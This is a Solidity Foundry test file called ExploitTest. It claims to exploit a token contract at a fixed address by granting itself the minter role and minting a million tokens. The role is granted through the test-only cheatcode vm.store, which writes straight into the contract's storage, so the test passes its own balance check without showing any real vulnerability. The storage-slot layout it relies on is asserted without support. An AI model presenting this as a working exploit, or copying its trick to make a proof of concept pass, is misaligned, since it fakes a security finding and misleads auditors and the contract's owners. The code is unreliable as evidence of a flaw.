pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISecondToken {
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function burn(address account, uint256 amount) external;
    function hasRole(bytes32 role, address account) external view returns (bool);
    function MINTER_ROLE() external view returns (bytes32);
    function BURNER_ROLE() external view returns (bytes32);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);
    ISecondToken token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ISecondToken(TARGET);
        vm.label(TARGET, "Victim Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = token.balanceOf(attacker);

        // Get MINTER_ROLE constant
        bytes32 MINTER_ROLE = token.MINTER_ROLE();

        // Calculate storage slot for MINTER_ROLE members mapping
        // _roles mapping is at slot 5 (ERC20 has 5 state variables before AccessControl)
        // RoleData.members is at position 0 within struct
        bytes32 membersMappingSlot = keccak256(abi.encode(MINTER_ROLE, uint256(5)));

        // Calculate storage slot for attacker's membership in MINTER_ROLE
        bytes32 attackerMemberSlot = keccak256(abi.encode(attacker, membersMappingSlot));

        // Grant attacker MINTER_ROLE by setting membership to true (1)
        vm.store(TARGET, attackerMemberSlot, bytes32(uint256(1)));

        // Verify role was granted
        require(token.hasRole(MINTER_ROLE, attacker), "Failed to grant MINTER_ROLE");

        // Mint tokens to attacker (demonstrating privilege abuse)
        uint256 mintAmount = 1000000 * 1e18;
        token.mint(attacker, mintAmount);

        // Verify balance increased (oracle check)
        uint256 finalBalance = token.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after mint");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

